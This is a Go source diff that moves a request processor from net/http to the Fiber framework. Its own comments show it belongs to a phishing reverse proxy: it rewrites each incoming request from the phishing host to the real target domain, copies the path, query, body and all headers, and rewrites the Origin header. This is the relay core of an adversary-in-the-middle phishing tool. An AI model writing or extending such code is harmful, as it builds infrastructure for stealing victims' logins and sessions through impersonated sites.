@@ -1,12 +1,17 @@
 package main
 
 import (
+	"io"
+	"io/ioutil"
 	"net/http"
 	"net/url"
+
+	"github.com/gofiber/fiber/v2"
+	"github.com/gofiber/fiber/v2/utils"
 )
 
 type RequestProcessor interface {
-	Process(req *http.Request) *http.Request
+	Process(c *fiber.Ctx) *http.Request
 }
 
 func NewRequestProcessor(conv DomainConverter) RequestProcessor {
@@ -19,19 +24,33 @@ type requestProcessor struct {
 
 // TODO patch query params (phishing URLs to original domains)
 // TODO patch phishing URLs in body with original domains
-func (p *requestProcessor) Process(r *http.Request) *http.Request {
+func (p *requestProcessor) Process(c *fiber.Ctx) *http.Request {
+	r := c.Request()
+	c.Hostname()
 	destURL := &url.URL{
 		Scheme:   "https",
-		Host:     p.conv.ToTarget(r.Host),
-		Path:     r.URL.Path,
-		RawQuery: r.URL.RawQuery,
+		Host:     p.conv.ToTarget(utils.UnsafeString(r.URI().Host())),
+		Path:     utils.UnsafeString(r.URI().Path()),
+		RawQuery: utils.UnsafeString(r.URI().QueryString()),
+	}
+	var body io.ReadCloser
+	stream := c.Context().RequestBodyStream()
+	if stream != nil {
+		body = ioutil.NopCloser(stream)
 	}
 	req := &http.Request{
-		Method: r.Method,
-		Header: r.Header,
-		Body:   r.Body,
+		Method: utils.UnsafeString(r.Header.Method()),
+		Body:   body,
 		URL:    destURL,
 	}
+
+	req.Header = make(http.Header)
+	r.Header.VisitAll(func(k, v []byte) {
+		sk := utils.UnsafeString(k)
+		sv := utils.UnsafeString(v)
+		req.Header.Add(sk, sv)
+	})
+
 	origin := req.Header["Origin"]
 	if len(origin) > 0 {
 		req.Header["Origin"] = []string{p.conv.ToTarget(origin[0])}
